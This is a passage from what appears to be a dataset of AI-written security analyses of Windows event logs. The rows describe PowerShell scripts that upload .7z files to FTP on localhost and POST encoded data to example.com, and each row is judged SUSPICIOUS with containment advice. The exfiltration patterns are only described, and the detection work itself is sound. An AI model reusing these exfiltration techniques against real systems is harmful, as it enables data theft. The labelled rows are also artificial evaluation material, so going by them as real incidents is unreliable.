   - `hostname.exe` and `whoami.exe` are executed without suspicious command-line arguments, although their usage is often benign for system diagnostics.
   
2. **Suspicious PowerShell Script:**
   - There is a PowerShell script execution at 2024-10-22 15:50:13, which attempts to check for connectivity, and subsequently upload files from `%windir%\temp` to an FTP server at `127.0.0.1`.
   - The script uses `System.Net.WebClient` for file upload, which is a pattern often associated with malicious activities like data exfiltration.

3. **Privilege Context:**
   - The processes are executed by a user named `admin_test` on SERVER002 with high integrity levels.
   - High-level integrity indicates administrative privileges, which is common, but usage in combination with suspicious behavior heightens concern.

4. **Time Anomaly:**
   - There are records of time changes in the system logs, reflected by EventID 1 in the Kernel-General log, and EventID 4616 in Security auditing.
   - These time discrepancies could be indicative of attempts to obfuscate log activities, but more context is required to conclusively attribute this to malicious intent.

### Detailed Assessment:
- **PowerShell Script:**
  - The PowerShell command is structured to upload `.7z` files from a temporary directory using FTP protocol which, despite happening on localhost, is highly suspicious if this is not part of a known administrative script.
  - FTP is a clear-text protocol and usually discouraged for secure file uploading, particularly with no credentials shown, which might indicate testing or misuse.

- **Recurrent Process Executions:**
  - The repeated use of `wevtutil.exe` in a brief timeframe, without clear context or accompanying configuration or logs/events, could be suspicious if not part of a usual log maintenance or gathering process by an admin tool/script.
  - `conhost.exe` is usually a host for Console infrastructure and is normal to observe in Windows environments, yet needs verification if these are related to valid admin tools.

### Resolution:
Based on the logs and activities reviewed, the anomalous PowerShell usage along with the frequent and potentially inconsistent execution of system utilities suggest a potential threat that warrants further examination.

**Resolution: SUSPICIOUS**
- The activities outlined do not conclusively prove malicious intent but do present typical behavior patterns needing deeper analysis.
- Recommendation: Initiate further investigation to track the script's intent and origin, validate configuration management processes on the host, and verify administrative processes that involve these utilities. Monitor for similar activities across other hosts and raise alerts for any unexpected data movement or file changes."
Network-Based Data Transfer in Small Chunks,"### Analysis of Windows Event Logs

#### System Log:
The logs in the System channel pertain to Windows update activities. The updates recorded are specifically related to ""Security Intelligence Update for Microsoft Defender Antivirus"", including various phases of the update process. There are no indications of failures or errors associated with these updates.

#### Application Log:
There is an entry indicating that Windows Defender is in the 'on' state, reflecting that the system’s antivirus is active and presumably functioning as expected. It does not show any issues or anomalies.

#### Sysmon Log:
- **Processes of Interest**: A notable pattern involves the execution of several system utilities such as `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and particularly `powershell.exe`.
- **PowerShell Activity**: The PowerShell command line indicates a script performing file read operations and HTTP POST requests with encoded data via `Invoke-WebRequest` to `http://example.com`. This behavior is suspicious for several reasons:
  - Data encoding and HTTP networking suggest potential data exfiltration.
  - The use of `[System.IO.File]::OpenRead([User specified])` implies reading an unspecified file type and size.
  
- **User Context**: The activities are executed under `SERVER002\admin_test` account, indicating high integrity level sessions, which allows for extensive system access, a potential risk if misused.

#### Security Log:
The security logs record credential validation attempts involving a Microsoft account and credential validation return codes. However, the return code ""3221226021"" indicates an error often associated with unsuccessful attempts to retrieve credentials, suggesting potential unauthorized attempts to interact with Microsoft service credentials.

#### Windows PowerShell Log:
The PowerShell logs demonstrate various PowerShell provider activities that accompany script execution similar to the one seen in Sysmon. The focused activity on data handling and usage of web requests in PowerShell scripts further corroborates potential unauthorized attempts to manipulate and transfer data.

### Assessment and Conclusion:

- **Suspicious Activity**: The highlighted use of PowerShell for potentially malicious intent, particularly the action to POST encoded data, is usually anomalous in a regular administrative scripting context, suggesting possible data exfiltration or staging activity.
- **Threats or Risks Identified**: Possible unauthorized access attempts and data leakage using PowerShell require immediate investigation due to the high integrity level of the processes involved.
- **Potential Compromise**: The observed behaviors—especially around PowerShell—can potentially indicate system compromise or misuse by an administrative-level account.

### Recommended Resolution: **SUSPICIOUS**

### Guidance on Next Steps:
1. **Immediate Containment**: Disable the user account (`admin_test`) involved in these activities to prevent further suspicious operations.
2. **Detailed Investigation**: Review this account's recent activities, network traffic records, and any system data that was potentially accessed or manipulated.
3. **Threat Hunting**: Conduct a deeper forensic analysis to identify and trace any additional malicious scripts or signs of data exfiltration.
4. **Review Security Configurations**: Strengthen PowerShell logging, restrict its usage, and apply security policies for high-fidelity monitoring to prevent unauthorized usage.
5. **User Education & Training**: Provide training on recognizing and responding to indicators of system compromise, including unusual account activity or unexpected PowerShell executions.

This investigation outlines critical steps and awareness needed moving forward to assure system integrity and prevent future security incidents."
